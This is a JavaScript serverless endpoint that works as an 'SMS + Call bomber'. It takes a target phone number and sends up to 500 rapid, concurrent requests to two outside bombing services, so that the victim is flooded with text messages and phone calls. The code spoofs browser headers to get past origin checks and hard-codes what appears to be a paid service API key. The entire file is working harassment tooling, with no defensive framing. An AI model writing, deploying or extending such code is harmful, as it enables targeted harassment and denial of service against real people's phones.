// api/smsb.js — DUAL API (SMS + Call) with fallback
export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") return res.status(204).end();
  if (req.method !== "POST") return res.status(405).json({ error: "POST only" });

  const body = req.body || {};
  const number = String(body.number || "").replace(/\D/g, "").slice(-10);
  const count  = Math.min(Math.max(parseInt(body.count || 1, 10), 1), 500);
  const delay  = Math.min(Math.max(parseFloat(body.delay || 0), 0), 5);
  const concurrency = Math.min(Math.max(parseInt(body.concurrency || 10, 10), 1), 30);
  const mode   = String(body.mode || "both").toLowerCase(); // 'sms' | 'call' | 'both'

  if (number.length < 10) return res.status(400).json({ error: "bad number" });

  const TIMEOUT = 8000;
  const MAX_RETRIES = 2;

  // ---------- API 1: SMS Bomber ----------
  async function callSMSApi() {
    const payload = { number, mobile: number, phone: number, num: number };
    try {
      const controller = new AbortController();
      const tid = setTimeout(() => controller.abort(), TIMEOUT);

      const r = await fetch("https://coroauto-sms.vercel.app/api/bomb", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
          "Accept": "application/json",
          "Origin": "https://coroauto-sms.vercel.app",
          "Referer": "https://coroauto-sms.vercel.app/"
        },
        body: JSON.stringify(payload),
        signal: controller.signal
      });
      clearTimeout(tid);

      if (!r.ok) return { ok: false, api: "SMS", status: r.status };
      const text = await r.text();
      let ok = true;
      try {
        const j = JSON.parse(text);
        if (j.status === false || j.success === false) ok = false;
      } catch { /* non-JSON = ok */ }
      return { ok, api: "SMS", status: r.status };
    } catch (e) {
      return { ok: false, api: "SMS", error: String(e.message || e) };
    }
  }

  // ---------- API 2: Call Bomber ----------
  async function callCallApi() {
    const API_URL = "https://api.call-bomber.online/admin/paid/key";
    const API_KEY = "NK-E8F619BA-7EA1E855-A62CEC75";
    const url = `${API_URL}?key=${API_KEY}&num=${number}`;

    try {
      const controller = new AbortController();
      const tid = setTimeout(() => controller.abort(), TIMEOUT);

      const r = await fetch(url, {
        method: "GET",
        headers: {
          "User-Agent": "Call-Bomber-Bot/2.0",
          "Accept": "application/json"
        },
        signal: controller.signal
      });
      clearTimeout(tid);

      if (!r.ok) return { ok: false, api: "CALL", status: r.status };
      const text = await r.text();
      let ok = true;
      try {
        const j = JSON.parse(text);
        if (j.status === "error" || j.success === false) ok = false;
      } catch { /* non-JSON = ok */ }
      return { ok, api: "CALL", status: r.status };
    } catch (e) {
      return { ok: false, api: "CALL", error: String(e.message || e) };
    }
  }

  // ---------- Dual Fire (parallel) ----------
  async function dualFire(index) {
    if (mode === "sms")  return [await callSMSApi()];
    if (mode === "call") return [await callCallApi()];

    // 'both' — dono parallel chalao
    const results = await Promise.allSettled([callSMSApi(), callCallApi()]);
    return results.map(r => r.status === "fulfilled" ? r.value : { ok: false, error: "rejected" });
  }

  // ---------- Batch Executor ----------
  const results = [];
  const started = Date.now();
  let smsOk = 0, smsFail = 0, callOk = 0, callFail = 0;

  for (let i = 0; i < count; i += concurrency) {
    const batchEnd = Math.min(i + concurrency, count);
    const batch = [];
    for (let j = i; j < batchEnd; j++) {
      batch.push(dualFire(j));
    }
    const batchResults = await Promise.all(batch);

    for (const arr of batchResults) {
      for (const r of arr) {
        results.push(r);
        if (r.api === "SMS")  r.ok ? smsOk++  : smsFail++;
        if (r.api === "CALL") r.ok ? callOk++ : callFail++;
      }
    }

    if (delay > 0 && batchEnd < count) {
      await new Promise(r => setTimeout(r, delay * 1000));
    }
  }

  const totalOk = results.filter(r => r.ok).length;
  const duration = Date.now() - started;

  return res.status(200).json({
    success: true,
    mode,
    total_requests: count,
    total_hits: totalOk,
    sms:  { sent: smsOk,  failed: smsFail,  api: "coroauto-sms" },
    call: { sent: callOk, failed: callFail, api: "call-bomber.online" },
    duration_ms: duration,
    concurrency,
    speed: `${(count / (duration / 1000)).toFixed(2)} req/s`
  });
}
